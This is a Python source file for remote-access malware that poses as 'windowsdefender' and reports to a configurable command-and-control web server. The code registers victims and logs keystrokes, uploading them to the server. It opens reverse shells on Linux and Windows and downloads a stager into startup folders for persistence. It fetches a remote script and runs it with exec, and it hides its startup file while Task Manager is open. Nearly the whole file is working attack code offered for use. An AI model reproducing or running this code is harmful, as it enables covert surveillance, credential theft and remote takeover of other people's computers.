import subprocess
import psutil
import time
import os
import platform
import requests
import shutil
import getpass
import threading
from socket import *
from Cryptodome.Cipher import AES
from datetime import timezone, datetime, timedelta
import sys
from ctypes import *

OS = platform.uname()[0]
if OS == "Windows":
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

### NAME OF PAYLOAD AND STAGER FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
_STAGER_NAME = "windowsdefender"

### IF AUTO START == 1, STAGER WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
_AUTOSTART_STAGER = 1
_AUTOSTART_STAGER_DESKTOP_SHORTCUTS = 0

### FULL ADDRESS TO THE WEBSERVER
_WEB_SERVER = "127.0.0.1:3000"

### REMOVE FROM STARTUP UNTIL TASKMANAGER IS CLOSED WINDOWS ONLY ###
_WIN_TASK_MANANGER_REMOVE_STARTUP = 0

### DETECT VIRTUAL MACHINE ###
_REMOVE_IF_IN_VM = 1

### PAYLOAD STAGING OPTIONS ###
# 1 = EVAL SCRIPT FROM URL IN MEMORY#
# 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #
_STAGING_OPT = 1

root = 0

### If staging == 1, load these variable's , eval payload needs these variables to run properly ###
###################################################################################################

if _STAGING_OPT == 1:
    import random
    import shlex
    import datetime
    import PIL

    if OS == "Windows":
        pass
    else:pass
    
### PAYLOAD OPTIONS ###
    _FAST_ROOT_OPT = 0
    _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
    _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
    _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
    _OS = platform.uname()[0]
    username = getpass.getuser()

### Get current clients ip address from master server ###
    def get_ip():
        try:
                proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                return proc.content.decode('utf8')

        except Exception as e:
            pass
            
    _MY_IP = get_ip()
    while _MY_IP == None:
        _MY_IP = get_ip()

### Get current clients master reverse shell information ###
    def get__RSHELL_OPT_ip():
        try:
            proc = requests.get('http://{0}/rshell/{1}/{2}/{3}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id))
            return proc.content.decode('utf8')
        except Exception as e:
            pass
    
### Requests to insert found wifi names into database ###
    def insert_wifi_name(wifi_name):
        try:
            proc = requests.get('http://{0}/wifi_name/{1}/{2}'.format(_WEB_SERVER, current_machine_id, wifi_name))
        except Exception as e:
            pass

### KEY LOGGER FUNCTIONS ###
    def start_keylogger():
        GetAsyncKeyState = cdll.user32.GetAsyncKeyState
        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
        log = []
        logstring = ""

        # reset key states
        for i in range(256):
            GetAsyncKeyState(i)

        while True:
            if len(log) >= 25:
                # UPLOAD LOG HERE #
                for character in log:
                    logstring = logstring + character
                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
                logstring = ""
                log = []
            for i in range(256):
                if GetAsyncKeyState(i) & 1:
                    if i in special_keys:
                        pass
                    elif 0x30 <= i <= 0x5a:
                        ### characters a-z/0-9 ###
                        log.append("%c" % i,)
                    else:
                        pass   
    
### Reverse shell function ###
    def _RSHELL_OPT_():
        try:
            if platform.uname()[0] == "Linux":
                    try:
                        exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip().split()[0], get__RSHELL_OPT_ip().split()[1]))
                    except Exception as e:
                        timer = threading.Timer(5, _RSHELL_OPT_)
                        timer.start()
                        pass
                        
            elif platform.uname()[0] == "Windows":
                import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{0}".format(get__RSHELL_OPT_ip().split()[0]), int(get__RSHELL_OPT_ip().split()[1])))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()
                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()
                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
                    timer = threading.Timer(5, _RSHELL_OPT_)
                    timer.start()
                    pass
        except Exception as e:
            pass

### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
if OS == "Linux":
    _STAGER_LINK = "http://{0}/downloads/linux/stager".format(_WEB_SERVER)
    
elif OS == "Windows":
    _STAGER_LINK = "http://{0}/downloads/windows/stager".format(_WEB_SERVER)

### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
if _AUTOSTART_STAGER == 1:
    if platform.uname()[0] == "Linux":
        try:
            if _STAGER_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
                pass

        except Exception as e:
            pass
        else:
            try:
                requests.get(_STAGER_LINK)
                r = requests.get(_STAGER_LINK)
                file = open("./{0}".format(_STAGER_NAME), 'wb')
                subprocess.Popen(["chmod", "+x", "{0}".format(_STAGER_NAME)])
                file.write(r.content)
                file.close()
                shutil.move("./{0}", "/home/{1}/.config/".format(_STAGER_NAME, getpass.getuser()))
                with open("{0}.desktop".format(_STAGER_NAME), "w") as FILE:
                    _STARTUP_LINES = ["[Desktop Entry]", "Type=Application", "Version=1.0", "Name={0}".format(_STAGER_NAME),
                     "Comment=none", "Exec=/home/{0}/.config/{1}".format(getpass.getuser(), _STAGER_NAME), "StartupNotify=false",
                     "Terminal=false"]
                    for LINES in _STARTUP_LINES:
                        FILE.writelines(LINES + "\n")
                    FILE.close()
                shutil.move("./{0}.desktop".format(_STAGER_NAME), "/home/{0}/.config/autostart".format(getpass.getuser()))
            except Exception as e:
                pass
            
    elif platform.uname()[0] == "Windows":
        try:
            if "{0}.exe".format(_STAGER_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
                pass
            else:
                    requests.get(_STAGER_LINK)
                    r = requests.get(_STAGER_LINK)
                    file = open("./{0}.exe".format(_STAGER_NAME), 'wb')
                    file.write(r.content)
                    file.close()
                    shutil.move("./{0}.exe".format(_STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser()))
        except Exception as e:
            pass

def exec_payload_thread():
    r = requests.get("http://{0}/remote".format(_WEB_SERVER))
    _PAYLOAD_SCRIPT = r.text
    exec(_PAYLOAD_SCRIPT)

if _STAGING_OPT == 1:
    threading.Thread(target=exec_payload_thread).start()
    
while 1:
    time.sleep(1)
    RUNNING = 0
    _WIN_TASK_MANAGER_RUNNING = 0
    for PROC in psutil.process_iter():
        if PROC.name() == "Taskmgr.exe":
            _WIN_TASK_MANAGER_RUNNING = 1
            
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                pass
            else:
                shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))    

### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
    if _WIN_TASK_MANAGER_RUNNING == 1:
        try:
                           
                if OS == "Windows":

### IF STAGER IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###
          
                    if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                            os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))
                        shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
                        
                        PROC_LIST = []
                        while _WIN_TASK_MANAGER_RUNNING == 1:
                            for PROC in psutil.process_iter():
                                if PROC.name() == "Taskmgr.exe":
                                    PROC_LIST.append("Taskmgr")
                                                              
                                if len(PROC_LIST) == 0:
                                    _WIN_TASK_MANAGER_RUNNING = 0
                                    
                            PROC_LIST = []
                            time.sleep(1)                        
                            
        except Exception as e:
            pass

### WHEN TASK MANAGER IS NO LONGER OPENED MOVE STAGER FILE BACK TO THE STARTUP FOLDER ###
    if _WIN_TASK_MANAGER_RUNNING == 0:
        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))
            shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(getpass.getuser()))

            
